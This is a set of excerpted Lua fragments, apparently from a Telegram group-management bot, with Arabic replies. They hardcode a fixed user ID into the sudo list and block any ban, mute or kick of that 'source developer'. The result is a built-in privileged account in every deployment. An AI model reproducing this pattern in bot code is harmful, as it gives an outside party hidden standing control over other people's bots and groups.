...
Id_Sudo = Sudo
List_Sudos = {Id_Sudo,932565396,1906006212}
...
var = true  
elseif tonumber(user_id) == tonumber(1906006212) then
var = true  
...
if result.id_ == tonumber(1906006212) then
send(msg.chat_id_, msg.id_, "❈︙لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مطور السورس \n")
return false 
end
...
if tonumber(userid) == tonumber(1906006212) then
send(msg.chat_id_, msg.id_, "❈︙لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مطور السورس \n")
return false 
end
...
if result.sender_user_id_ == tonumber(1906006212) then
send(msg.chat_id_, msg.id_, "❈︙لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مطور السورس \n")
return false 
end
...
if userid == tonumber(1906006212) then
send(msg.chat_id_, msg.id_, "❈︙لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} مطور السورس \n")
return false 
end
